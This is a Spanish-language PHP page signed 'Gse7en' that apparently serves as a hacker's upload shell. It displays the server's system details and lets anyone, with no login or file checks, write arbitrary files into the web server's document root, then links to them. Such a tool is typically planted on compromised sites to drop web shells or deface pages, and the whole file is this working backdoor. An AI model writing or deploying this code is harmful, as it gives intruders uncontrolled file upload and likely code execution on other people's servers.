<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Uploader By Gse7en</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            color: #333;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 500px;
            text-align: center;
        }
        input[type="file"] {
            margin: 20px 0;
        }
        input[type="submit"] {
            background-color: #28a745;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        input[type="submit"]:hover {
            background-color: #218838;
        }
        p {
            margin: 10px 0;
        }
        a {
            color: #007bff;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Uploader By Gse7en</h2>
        <?php
        // Mostrar información del sistema
        echo "<p>Información del sistema: " . php_uname() . "</p>";

        // Verificar si se ha enviado el formulario
        if (isset($_POST['upload'])) {
            // Ruta donde se guardará el archivo
            $root = $_SERVER['DOCUMENT_ROOT'];
            $files = basename($_FILES['idx_file']['name']);
            $dest = $root . '/' . $files;

            // Intentar subir el archivo
            if (is_writable($root)) {
                if (@move_uploaded_file($_FILES['idx_file']['tmp_name'], $dest)) {
                    $web = "http://" . $_SERVER['HTTP_HOST'] . "/";
                    echo "<p>Subida exitosa -> <a href='$web$files'>$web$files</a></p>";
                } else {
                    echo "<p>Error: No se pudo subir el archivo en el directorio raíz.</p>";
                }
            } else {
                echo "<p>Error: No se puede escribir en el directorio raíz.</p>";
            }
        } else {
            echo "<p>No se eligió ningún archivo.</p>";
        }
        ?>

        <!-- Formulario de subida de archivos -->
        <form action="" method="post" enctype="multipart/form-data">
            <input type="file" name="idx_file" required>
            <input type="submit" name="upload" value="Subir archivo">
        </form>
    </div>
</body>
</html>
